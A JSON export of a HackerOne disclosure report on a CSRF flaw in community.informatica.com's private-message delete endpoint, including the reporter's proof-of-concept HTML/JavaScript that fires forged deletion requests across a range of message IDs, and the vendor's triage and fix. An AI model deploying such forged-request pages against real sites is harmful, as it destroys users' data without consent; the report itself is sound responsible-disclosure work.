{"id":45050,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NTA1MA==","url":"https://hackerone.com/reports/45050","title":"[community.informatica.com] - CSRF in Private Messages allows to move user's messages to Trash","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2015-01-24T16:36:08.506Z","submitted_at":"2015-01-24T16:36:08.506Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"artem","url":"/artem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/2i1RS84yiWXNaegFdcLMbwu9/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":453,"url":"https://hackerone.com/informatica","handle":"informatica","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Informatica","twitter_handle":"informatica","website":"https://www.informatica.com/","about":"Informatica Corporation is the worldâ€™s number one independent provider of data integration software."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-03-02T02:46:07.403Z","bug_reporter_agreed_on_going_public_at":"2016-02-01T02:45:50.139Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\r\n\r\nhttps://community.informatica.com/pm-delete.jspa doesn't check Referrer header or CSRF token when you move a message to Trash. As a result, an attacker can implement CSRF attack, and make a victim move messages to Trash. Then, according to the message on Trash page (https://community.informatica.com/pm.jspa?folderID=4), Trash is emptied daily. So a victim can lose messages.\r\n\r\nTo remove a message, an attacker needs to know a message ID. Message IDs seem to be global, so an attacker can do the following:\r\n- guess the current max message ID (for example, an attacker can send a message to yourself, and use this message ID)\r\n- try to remove N messages with IDs that belong to an interval [max_message_id - N, max_message_id]\r\n\r\nFor example, a script like the following may be placed on attacker's page:\r\n\r\n\u003chtml\u003e\r\n \u003cbody\u003e\r\n  \u003cdiv id=\"delete\"\u003e\u003c/div\u003e\r\n  \u003cscript\u003e\r\n   var start_message_id = 16000;\r\n   var message_count = 100;\r\n   var text = \"\";\r\n   var message_id = start_message_id;\r\n   for (i = 0; i \u003c message_count; i++) {\r\n     text += \"\u003cimg src=\\\"https://community.informatica.com/pm-delete.jspa?1\u0026messageID=\" + message_id + \"\\\"\\/\u003e\";\r\n     message_id++;\r\n   }\r\n   document.getElementById(\"delete\").innerHTML = text;\r\n  \u003c/script\u003e\r\n \u003c/body\u003e\r\n\u003c/html\u003e\r\n\r\nWhen a victim loads the page above, the script will remove messages with IDs from 16000 to 16100. The script above sends a GET request for each possible message. As a result, it works quite slow. So it might be hard to remove all users messages because a victim should stay on the page before the script is finished.\r\n\r\nI tried to modify the script above to send a request for a batch of messages:\r\n\r\n\u003cscript\u003e\r\n   var start_message_id = 15900;\r\n   var message_count = 200;\r\n   var N = 1;\r\n   var text = \"\u003cimg src=\\\"https://community.informatica.com/pm-delete.jspa?1\";\r\n   var message_id = start_message_id;\r\n   for (i = 0; i \u003c message_count; i++) {\r\n     text += \"\u0026messageID=\" + message_id;\r\n     if (i != 0 \u0026\u0026 i % N == 0) {\r\n       text += \"\\\"\\/\u003e\";\r\n       document.getElementById(\"delete\").innerHTML += text;\r\n       text = \"\u003cimg src=\\\"https://community.informatica.com/pm-delete.jspa?1\";\r\n     }\r\n     message_id++;\r\n   }\r\n  \u003c/script\u003e\r\n\r\nBut it doesn't seem to work fine. Seems the application stops removing if it finds not existing message ID.\r\n\r\nAnyway, it can damage user's data a lot. Please take a look.\r\n\r\nArtem","vulnerability_information_html":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://community.informatica.com/pm-delete.jspa\" href=\"/redirect?url=https%3A%2F%2Fcommunity.informatica.com%2Fpm-delete.jspa\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://community.informatica.com/pm-delete.jspa\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e doesn\u0026#39;t check Referrer header or CSRF token when you move a message to Trash. As a result, an attacker can implement CSRF attack, and make a victim move messages to Trash. Then, according to the message on Trash page (\u003ca title=\"https://community.informatica.com/pm.jspa?folderID=4\" href=\"/redirect?url=https%3A%2F%2Fcommunity.informatica.com%2Fpm.jspa%3FfolderID%3D4\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://community.informatica.com/pm.jspa?folderID=4\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e), Trash is emptied daily. So a victim can lose messages.\u003c/p\u003e\n\n\u003cp\u003eTo remove a message, an attacker needs to know a message ID. Message IDs seem to be global, so an attacker can do the following:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eguess the current max message ID (for example, an attacker can send a message to yourself, and use this message ID)\u003c/li\u003e\n\u003cli\u003etry to remove N messages with IDs that belong to an interval [max_message_id - N, max_message_id]\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eFor example, a script like the following may be placed on attacker\u0026#39;s page:\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;html\u0026gt;\u003cbr\u003e\n \u0026lt;body\u0026gt;\u003cbr\u003e\n  \u0026lt;div id=\u0026quot;delete\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\u003cbr\u003e\n  \u0026lt;script\u0026gt;\u003cbr\u003e\n   var start_message_id = 16000;\u003cbr\u003e\n   var message_count = 100;\u003cbr\u003e\n   var text = \u0026quot;\u0026quot;;\u003cbr\u003e\n   var message_id = start_message_id;\u003cbr\u003e\n   for (i = 0; i \u0026lt; message_count; i++) {\u003cbr\u003e\n     text += \u0026quot;\u0026lt;img src=\\\u0026quot;https://community.informatica.com/pm-delete.jspa?1\u0026amp;messageID=\u0026quot; + message_id + \u0026quot;\\\u0026quot;\\/\u0026gt;\u0026quot;;\u003cbr\u003e\n     message_id++;\u003cbr\u003e\n   }\u003cbr\u003e\n   document.getElementById(\u0026quot;delete\u0026quot;).innerHTML = text;\u003cbr\u003e\n  \u0026lt;/script\u0026gt;\u003cbr\u003e\n \u0026lt;/body\u0026gt;\u003cbr\u003e\n\u0026lt;/html\u0026gt;\u003c/p\u003e\n\n\u003cp\u003eWhen a victim loads the page above, the script will remove messages with IDs from 16000 to 16100. The script above sends a GET request for each possible message. As a result, it works quite slow. So it might be hard to remove all users messages because a victim should stay on the page before the script is finished.\u003c/p\u003e\n\n\u003cp\u003eI tried to modify the script above to send a request for a batch of messages:\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;script\u0026gt;\u003cbr\u003e\n   var start_message_id = 15900;\u003cbr\u003e\n   var message_count = 200;\u003cbr\u003e\n   var N = 1;\u003cbr\u003e\n   var text = \u0026quot;\u0026lt;img src=\\\u0026quot;https://community.informatica.com/pm-delete.jspa?1\u0026quot;;\u003cbr\u003e\n   var message_id = start_message_id;\u003cbr\u003e\n   for (i = 0; i \u0026lt; message_count; i++) {\u003cbr\u003e\n     text += \u0026quot;\u0026amp;messageID=\u0026quot; + message_id;\u003cbr\u003e\n     if (i != 0 \u0026amp;\u0026amp; i % N == 0) {\u003cbr\u003e\n       text += \u0026quot;\\\u0026quot;\\/\u0026gt;\u0026quot;;\u003cbr\u003e\n       document.getElementById(\u0026quot;delete\u0026quot;).innerHTML += text;\u003cbr\u003e\n       text = \u0026quot;\u0026lt;img src=\\\u0026quot;https://community.informatica.com/pm-delete.jspa?1\u0026quot;;\u003cbr\u003e\n     }\u003cbr\u003e\n     message_id++;\u003cbr\u003e\n   }\u003cbr\u003e\n  \u0026lt;/script\u0026gt;\u003c/p\u003e\n\n\u003cp\u003eBut it doesn\u0026#39;t seem to work fine. Seems the application stops removing if it finds not existing message ID.\u003c/p\u003e\n\n\u003cp\u003eAnyway, it can damage user\u0026#39;s data a lot. Please take a look.\u003c/p\u003e\n\n\u003cp\u003eArtem\u003c/p\u003e\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-03-02T02:45:50.489Z","allow_singular_disclosure_after":-152334845.06220582,"singular_disclosure_allowed":true,"vote_count":1,"voters":["shukumar"],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":413161,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It was submitted 4 months ago, any update?","markdown_message":"\u003cp\u003eIt was submitted 4 months ago, any update?\u003c/p\u003e\n","automated_response":false,"created_at":"2015-05-16T05:18:59.821Z","updated_at":"2015-05-16T05:18:59.821Z","actor":{"username":"artem","cleared":false,"url":"/artem","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/2i1RS84yiWXNaegFdcLMbwu9/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":425919,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@artem - Our team is working on this, will update you soon.","markdown_message":"\u003cp\u003e\u003ca href=\"/artem\"\u003e@artem\u003c/a\u003e - Our team is working on this, will update you soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-05-21T16:44:05.583Z","updated_at":"2015-05-21T16:44:05.583Z","actor":{"username":"spiyer2","cleared":false,"url":"/spiyer2","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":623021,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi artem,\n\nThank you for your report. We have assessed it and determined that the issue you have disclosed is valid. It has been submitted to our technical teams, and we will notify you once the issue has been resolved. Thank you for your efforts in helping keep Informatica safe! We look forward to your future submissions.\n\nRegards,\n-The Informatica Team","markdown_message":"\u003cp\u003eHi artem,\u003c/p\u003e\n\n\u003cp\u003eThank you for your report. We have assessed it and determined that the issue you have disclosed is valid. It has been submitted to our technical teams, and we will notify you once the issue has been resolved. Thank you for your efforts in helping keep Informatica safe! We look forward to your future submissions.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n-The Informatica Team\u003c/p\u003e\n","automated_response":false,"created_at":"2015-10-16T16:09:59.621Z","updated_at":"2015-10-16T16:09:59.621Z","actor":{"username":"femtobarn","cleared":false,"url":"/femtobarn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/399/85a0f0ca27736211c52656d1b8a5421625c9e3c3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":728633,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2015-12-21T19:45:11.696Z","updated_at":"2015-12-21T19:45:11.696Z","additional_data":{"old_title":"CSRF in Private Messages allows to move user's messages to Trash on community.informatica.com","new_title":"[community.informatica.com] - CSRF in Private Messages allows to move user's messages to Trash"},"actor":{"username":"secark","cleared":false,"url":"/secark","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":776003,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hello @artem ,\n\nOur team has remediated this vulnerability. Please check your original Proof of Concept, and let us know if you think the bug is still exploitable. If you find a way to bypass our fix, please open a new and give us further details. Thanks for your efforts in keeping Informatica safe, and well done!\n\nRegards,\nThe Informatica Team","markdown_message":"\u003cp\u003eHello \u003ca href=\"/artem\"\u003e@artem\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eOur team has remediated this vulnerability. Please check your original Proof of Concept, and let us know if you think the bug is still exploitable. If you find a way to bypass our fix, please open a new and give us further details. Thanks for your efforts in keeping Informatica safe, and well done!\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nThe Informatica Team\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-28T18:58:08.588Z","updated_at":"2016-01-28T18:58:08.588Z","actor":{"username":"ttoko","cleared":false,"url":"/ttoko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/347/01c0660d8da33d4b1d468e35562eea9983d24bf3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"artem","url":"/artem"},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":778845,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"It's not reproducible anymore.","markdown_message":"\u003cp\u003eIt\u0026#39;s not reproducible anymore.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-01T02:45:50.171Z","updated_at":"2016-02-01T02:45:50.171Z","first_to_agree":true,"actor":{"username":"artem","cleared":false,"url":"/artem","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/2i1RS84yiWXNaegFdcLMbwu9/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":820092,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-02T02:46:07.463Z","updated_at":"2016-03-02T02:46:07.463Z","actor":{"url":"/informatica","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Informatica"}},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1290696,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"Congratulations! Your bug is eligible for swag. Please make sure your address and shirt size are correct in Hacker One.\n\nThank you!","markdown_message":"\u003cp\u003eCongratulations! Your bug is eligible for swag. Please make sure your address and shirt size are correct in Hacker One.\u003c/p\u003e\n\n\u003cp\u003eThank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-08T21:41:04.312Z","updated_at":"2016-11-08T21:41:04.312Z","actor":{"url":"/informatica","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Informatica"}},"reporter":{"username":"artem","url":"/artem"},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1507255,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-27T05:22:03.195Z","updated_at":"2017-02-27T05:22:03.195Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":28058},"actor":{"username":"tarantula_hawk","cleared":false,"url":"/tarantula_hawk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}